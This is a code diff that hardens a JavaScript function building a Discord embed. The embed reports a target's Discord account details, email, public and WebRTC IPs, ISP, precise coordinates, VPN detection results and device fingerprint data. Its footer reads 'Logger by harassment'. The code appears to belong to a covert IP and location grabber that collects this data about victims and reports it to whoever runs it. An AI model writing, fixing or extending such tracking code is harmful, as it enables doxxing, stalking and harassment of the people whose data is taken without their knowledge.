@@ -715,46 +715,52 @@
             console.log('👤 Discord User:', data.discordUser.username);
             console.log('==========================================');
             
+            // Helper function to ensure field values are valid strings
+            const safeValue = (value) => {
+                if (value === null || value === undefined || value === '') return 'Unknown';
+                return String(value);
+            };
+            
             const embed = {
                 title: "📊 Enhanced Device & Location Details",
-                color: data.vpnScore >= 50 ? 0xFF6B00 : 0xFF0000,
+                color: data.vpnScore >= 50 ? 16740864 : 16711680, // Use decimal instead of hex
                 fields: [
-                    { name: "👤 Discord Username", value: data.discordUser.username, inline: true },
-                    { name: "🆔 Discord ID", value: data.discordUser.id, inline: true },
-                    { name: "📧 Email", value: data.discordUser.email || "Not provided", inline: true },
-                    { name: "📍 Public IP", value: data.ip, inline: true },
-                    { name: "🔗 WebRTC IPs", value: data.webrtcIPs, inline: true },
-                    { name: "🌐 ISP/Org", value: data.isp, inline: true },
-                    { name: "🏢 ASN", value: data.asn, inline: true },
-                    { name: "🌍 Location", value: data.location, inline: false },
-                    { name: "🗺️ Precise Coordinates", value: data.mapLocation, inline: true },
-                    { name: "🛡️ VPN/Proxy Status", value: data.vpnStatus, inline: true },
-                    { name: "📊 VPN Detection Score", value: `${data.vpnScore}/100`, inline: true },
-                    { name: "🎯 Detection Confidence", value: data.vpnConfidence, inline: true },
-                    { name: "🔍 VPN Indicators", value: data.vpnIndicators || "None", inline: false },
-                    { name: "📡 Detection Methods", value: data.detectionMethods, inline: false },
-                    { name: "🖥️ Resolution", value: data.resolution, inline: true },
-                    { name: "🗣️ Language", value: data.language, inline: true },
-                    { name: "🕒 TimeZone", value: data.timeZone, inline: true },
-                    { name: "📅 Timestamp", value: data.timestamp, inline: false },
-                    { name: "📱 Device", value: data.deviceType, inline: true },
-                    { name: "🔋 Battery", value: data.batteryLevel, inline: true },
-                    { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true },
-                    { name: "🖥️ Operating System", value: data.os, inline: true },
-                    { name: "🔗 Status", value: data.onlineStatus, inline: true },
-                    { name: "📊 Uptime", value: data.uptime, inline: true },
-                    { name: "🖥️ CPU Cores", value: String(data.cpuCores), inline: true },
-                    { name: "📏 Height", value: data.navHeight, inline: true },
-                    { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true },
-                    { name: "🌐 Browser", value: data.browserName, inline: true },
-                    { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
-                    { name: "📶 Connection", value: data.connectionType, inline: true },
-                    { name: "⏱️ RTT", value: data.connectionRtt, inline: true },
-                    { name: "⬇️ Speed", value: data.connectionDownlink, inline: true }
+                    { name: "👤 Discord Username", value: safeValue(data.discordUser.username), inline: true },
+                    { name: "🆔 Discord ID", value: safeValue(data.discordUser.id), inline: true },
+                    { name: "📧 Email", value: safeValue(data.discordUser.email) || "Not provided", inline: true },
+                    { name: "📍 Public IP", value: safeValue(data.ip), inline: true },
+                    { name: "🔗 WebRTC IPs", value: safeValue(data.webrtcIPs), inline: true },
+                    { name: "🌐 ISP/Org", value: safeValue(data.isp), inline: true },
+                    { name: "🏢 ASN", value: safeValue(data.asn), inline: true },
+                    { name: "🌍 Location", value: safeValue(data.location), inline: false },
+                    { name: "🗺️ Precise Coordinates", value: safeValue(data.mapLocation), inline: true },
+                    { name: "🛡️ VPN/Proxy Status", value: safeValue(data.vpnStatus), inline: true },
+                    { name: "📊 VPN Detection Score", value: safeValue(data.vpnScore) + '/100', inline: true },
+                    { name: "🎯 Detection Confidence", value: safeValue(data.vpnConfidence), inline: true },
+                    { name: "🔍 VPN Indicators", value: safeValue(data.vpnIndicators) || "None", inline: false },
+                    { name: "📡 Detection Methods", value: safeValue(data.detectionMethods), inline: false },
+                    { name: "🖥️ Resolution", value: safeValue(data.resolution), inline: true },
+                    { name: "🗣️ Language", value: safeValue(data.language), inline: true },
+                    { name: "🕒 TimeZone", value: safeValue(data.timeZone), inline: true },
+                    { name: "📅 Timestamp", value: safeValue(data.timestamp), inline: false },
+                    { name: "📱 Device", value: safeValue(data.deviceType), inline: true },
+                    { name: "🔋 Battery", value: safeValue(data.batteryLevel), inline: true },
+                    { name: "⚡ Power Saving", value: safeValue(data.powerSavingMode), inline: true },
+                    { name: "🖥️ Operating System", value: safeValue(data.os), inline: true },
+                    { name: "🔗 Status", value: safeValue(data.onlineStatus), inline: true },
+                    { name: "📊 Uptime", value: safeValue(data.uptime), inline: true },
+                    { name: "🖥️ CPU Cores", value: safeValue(data.cpuCores), inline: true },
+                    { name: "📏 Height", value: safeValue(data.navHeight), inline: true },
+                    { name: "🚫 AdBlock", value: safeValue(data.adBlockEnabled), inline: true },
+                    { name: "🌐 Browser", value: safeValue(data.browserName), inline: true },
+                    { name: "🍪 Cookies", value: safeValue(data.cookiesEnabled), inline: true },
+                    { name: "📶 Connection", value: safeValue(data.connectionType), inline: true },
+                    { name: "⏱️ RTT", value: safeValue(data.connectionRtt), inline: true },
+                    { name: "⬇️ Speed", value: safeValue(data.connectionDownlink), inline: true }
                 ],
-                thumbnail: { url: data.discordUser.avatar },
+                thumbnail: { url: data.discordUser.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png' },
                 footer: { 
-                    text: `Logger by harassment • Data from: ${data.dataSources}`, 
+                    text: `Logger by harassment • Data from: ${safeValue(data.dataSources)}`, 
                     icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png?size=4096" 
                 }
             };
